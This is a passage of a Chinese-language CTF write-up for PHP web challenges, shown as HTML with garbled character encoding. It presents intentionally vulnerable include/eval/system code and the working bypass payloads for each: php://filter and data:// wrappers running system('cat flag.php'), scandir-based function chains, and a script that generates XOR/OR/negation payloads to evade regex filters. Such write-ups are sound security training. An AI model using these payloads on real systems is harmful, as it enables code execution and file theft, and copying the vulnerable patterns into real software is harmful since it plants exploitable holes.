punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>includeä¸ç”¨æ‹¬å·ï¼Œåˆ†å·å¯ä»¥ç”¨?&gt;ä»£æ›¿</p></blockquote><p>payloadï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">c=include$_GET[1]?>&amp;1=php://filter/read=convert.base64-encode/resource=flag.phpc=include$_GET[1]?>&amp;1=data://text/plain,<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cat flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>c=include$_GET[1]?>&amp;1=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Web33-36-0-9"><a href="#Web33-36-0-9" class="headerlink" title="Web33-36 [0-9]|/"></a>Web33-36 [0-9]|/</h2><p>33æ–°å¢åŒå¼•å·</p><p>34æ–°å¢å†’å·</p><p>35æ–°å¢&lt;|=</p><p>36æ–°å¢/|[0-9]</p><p>payload</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">c=include$_GET[a]?>&amp;1=php://filter/read=convert.base64-encode/resource=flag.phpc=include$_GET[a]?>&amp;1=data://text/palin,<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nl flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h2 id="Web37-include"><a href="#Web37-include" class="headerlink" title="Web37 include"></a>Web37 include</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php">c=data://text/palin,<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nl fla*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="Web38-php-file"><a href="#Web38-php-file" class="headerlink" title="Web38 php|file"></a>Web38 php|file</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|php|file/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php">c<span class="token operator">=</span>data<span class="token punctuation">:</span><span class="token comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Web39-includeåŠ åç¼€"><a href="#Web39-includeåŠ åç¼€" class="headerlink" title="Web39 includeåŠ åç¼€"></a>Web39 includeåŠ åç¼€</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php">?c=data:text/plain,<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cat fla?.php'</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Web40-0-9-å„ç§ç¬¦å·"><a href="#Web40-0-9-å„ç§ç¬¦å·" class="headerlink" title="Web40 [0-9]|å„ç§ç¬¦å·"></a>Web40 [0-9]|å„ç§ç¬¦å·</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\ï¼ˆ|\ï¼‰|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\'|\"|\,|\&lt;|\.|\>|\/|\?|\\\\/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‹¬å·æ£€æµ‹çš„æ˜¯ä¸­æ–‡æ‹¬å·ã€‚åŸºæœ¬æ€è·¯å°±æ˜¯ä¸å¸¦å­—ç¬¦ä¸²ä¸å¸¦æ•°å­—çº¯å‡½æ•°è¯»å–ã€‚</p><blockquote><p>current()å‡½æ•°è¿”å›æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ /å•å…ƒï¼Œé»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼<br>pos()å‡½æ•°åŒä¸Šï¼Œæ˜¯current()å‡½æ•°çš„åˆ«å<br>reset()å‡½æ•°ï¼Œå½“æ•°ç»„ä¸ä¸ºç©ºæ—¶è¿”å›æ•°ç»„ç¬¬ä¸€ä¸ªå•å…ƒçš„å€¼ï¼Œå¦‚æœæ•°ç»„ä¸ºç©ºåˆ™è¿”å›FALSE</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//æŸ¥çœ‹å½“ä¸‹ç›®å½•</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">current</span><span class="token punctuation">(</span><span class="token function">localeconv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">pos</span><span class="token punctuation">(</span><span class="token function">localeconv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">reset</span><span class="token punctuation">(</span><span class="token function">localeconv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>payload:</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">c<span class="token operator">=</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token function">array_reverse</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">current</span><span class="token punctuation">(</span><span class="token function">localeconv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Web41-0-9-a-z"><a href="#Web41-0-9-a-z" class="headerlink" title="Web41 [0-9]|[a-z]"></a>Web41 [0-9]|[a-z]</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i'</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"echo(<span class="token interpolation"><span class="token variable">$c</span></span>);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ­¤é¢˜è¿‡æ»¤äº†<code>$ã€+ã€-ã€^ã€~</code>ï¼Œå¯¼è‡´å¼‚æˆ–/è‡ªå¢/å–åæ„é€ å­—ç¬¦éƒ½æ— æ³•åœ¨ä½¿ç”¨ï¼Œä½†ç•™äº†ä¸ªè¿ç®—ç¬¦<code>|</code></p><p>è„šæœ¬ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: Y4tacker# @Date:   2020-11-21 20:31:22*/</span><span class="token comment">/*æ ¹æ®æ­£åˆ™è¡¨è¾¾å¼ç”Ÿæˆå¯¹åº”payload */</span><span class="token comment">//æˆ–</span><span class="token keyword">function</span> <span class="token function-definition function">orRce</span><span class="token punctuation">(</span><span class="token variable">$par1</span><span class="token punctuation">,</span> <span class="token variable">$par2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$par1</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token class-name">urldecode</span><span class="token punctuation">(</span><span class="token variable">$par2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//å¼‚æˆ–</span><span class="token keyword">function</span> <span class="token function-definition function">xorRce</span><span class="token punctuation">(</span><span class="token variable">$par1</span><span class="token punctuation">,</span> <span class="token variable">$par2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$par1</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$par2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//å–å</span><span class="token keyword">function</span> <span class="token function-definition function">negateRce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token constant">STDOUT</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'[+]your function: '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$system</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\r\n"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\r"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token constant">STDIN</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token constant">STDOUT</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'[+]your command: '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$command</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\r\n"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\r"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token constant">STDIN</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'[*] (~'</span> <span class="token operator">.</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token variable">$system</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">')(~'</span> <span class="token operator">.</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token variable">$command</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">');'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//mode=1ä»£è¡¨æˆ–ï¼Œ2ä»£è¡¨å¼‚æˆ–ï¼Œ3ä»£è¡¨å–å</span><span class="token comment">//å–åçš„è¯ï¼Œå°±æ²¡å¿…è¦ç”Ÿæˆå­—ç¬¦å»è·‘äº†ï¼Œå› ä¸ºæœ¬æ¥å°±æ˜¯ä¸å¯è§å­—ç¬¦ï¼Œç›´æ¥ç»•è¿‡æ­£åˆ™è¡¨è¾¾å¼</span><span class="token keyword">function</span> <span class="token function-definition function">generate</span><span class="token punctuation">(</span><span class="token variable">$mode</span><span class="token punctuation">,</span> <span class="token variable">$preg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/[0-9]/i'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//æ ¹æ®æ­£åˆ™è¡¨è¾¾å¼ä»å­—ç¬¦ä¸­æ’é™¤æ‰è¢«è¿‡æ»¤çš„ï¼Œç„¶åå†è¿›è¡Œæˆ–/å¼‚æˆ–ï¼Œä¹‹ååˆ¤æ–­è¯¥å­—ç¬¦æ˜¯å¦ä¸ºå¯è§å­—ç¬¦</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$mode</span> <span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$myfile</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"rce.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$contents</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token variable">$hex_i</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'0'</span> <span class="token operator">.</span> <span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                    <span class="token variable">$hex_i</span> <span class="token operator">=</span> <span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token variable">$hex_j</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'0'</span> <span class="token operator">.</span> <span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                    <span class="token variable">$hex_j</span> <span class="token operator">=</span> <span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$preg</span><span class="token punctuation">,</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$hex_i</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">preg_match</span><span class="token punctuation">(</span><span class="token variable">$preg</span><span class="token punctuation">,</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$hex_j</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">echo</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                    <span class="token variable">$par1</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"%"</span> <span class="token operator">.</span> <span class="token variable">$hex_i</span><span class="token punctuation">;</span>                    <span class="token variable">$par2</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'%'</span> <span class="token operator">.</span> <span class="token variable">$hex_j</span><span class="token punctuation">;</span>                    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$mode</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">orRce</span><span class="token punctuation">(</span><span class="token variable">$par1</span><span class="token punctuation">,</span> <span class="token variable">$par2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$mode</span> <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">xorRce</span><span class="token punctuation">(</span><span class="token variable">$par1</span><span class="token punctuation">,</span> <span class="token variable">$par2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">32</span> <span class="token operator">&amp;</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">126</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token variable">$contents</span> <span class="token operator">=</span> <span class="token variable">$contents</span> <span class="token operator">.</span> <span class="token variable">$res</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" "</span> <span class="token operator">.</span> <span class="token variable">$par1</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" "</span> <span class="token operator">.</span> <span class="token variable">$par2</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">,</span> <span class="token variable">$contents</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token function">negateRce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">generate</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Web42-52-gt-dev-null"><a href="#Web42-52-gt-dev-null" class="headerlink" title="Web42-52 &gt;/dev/null"></a>Web42-52 &gt;/dev/null</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" 